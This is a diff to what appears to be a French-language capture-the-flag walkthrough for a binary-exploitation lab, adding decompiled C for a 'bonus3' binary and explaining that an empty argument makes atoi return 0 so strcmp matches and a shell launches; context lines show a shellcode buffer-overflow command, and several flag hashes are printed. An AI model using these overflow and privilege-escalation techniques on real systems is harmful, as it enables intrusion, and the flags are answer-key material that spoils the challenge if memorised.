@@ -751,4 +751,78 @@ env LANG=nl SHELLCODE=$SHELLCODE /tmp/find
 LANG=nl ./bonus2 $(python -c 'print "A"*40') $(python -c 'print "B"*23 + "\x3a\xfb\xff\xbf"')
 ```
 
-# flag : 71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
+## flag : 71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
+
+# flag bonus 3
+
+```c
+undefined4 main(int param_1,int param_2)
+
+{
+  undefined4 return_val;
+  int iVar1;
+  char *pcVar2;
+  byte bVar3;
+  char buffer_65 [65];
+  undefined1 local_57;
+  char buffer_66 [66];
+  FILE *fd;
+  
+  bVar3 = 0;
+  fd = fopen("/home/user/end/.pass","r");
+  pcVar2 = buffer_65;
+  for (iVar1 = 0x21; iVar1 != 0; iVar1 = iVar1 + -1) {
+    pcVar2[0] = '\0';
+    pcVar2[1] = '\0';
+    pcVar2[2] = '\0';
+    pcVar2[3] = '\0';
+    pcVar2 = pcVar2 + ((uint)bVar3 * -2 + 1) * 4;
+  }
+  if ((fd == (FILE *)0x0) || (param_1 != 2)) {
+    return_val = 0xffffffff;
+  }
+  else {
+    fread(buffer_65,1,0x42,fd);
+    local_57 = 0;
+    iVar1 = atoi(*(char **)(param_2 + 4));
+    buffer_65[iVar1] = '\0';
+    fread(buffer_66,1,0x41,fd);
+    fclose(fd);
+    iVar1 = strcmp(buffer_65,*(char **)(param_2 + 4));
+    if (iVar1 == 0) {
+      execl("/bin/sh","sh",0);
+    }
+    else {
+      puts(buffer_66);
+    }
+    return_val = 0;
+  }
+  return return_val;
+}
+```
+
+le programme lit le contenu du fichier .pass et le stock dans buffer_65
+il prend ensuite argv[1] et le convertit en int pour null terminate buffer_65 à cet index
+pour lancer le shell il faut que le contenu de buffer_65 soit égal à argv[1]
+en testant avec ce programme:
+```c
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+
+int main() {
+    char flag[] = "579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245"; // flag du bonus 1
+    char *input = "";
+    int intput = atoi(input);
+
+    flag[intput] = '\0';
+    printf("%d" ,strcmp(flag, input));
+
+    return 0;
+}
+```
+
+nous avons remarqués que atoi("") retourne 0, donc en mettant une string vide en argument, on peut faire en sorte que buffer_65 soit égal à rien tout comme argv[1], et ainsi faire en sorte que strcmp retourne 0 et que le shell soit lancé.
+
+
+# flag 3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
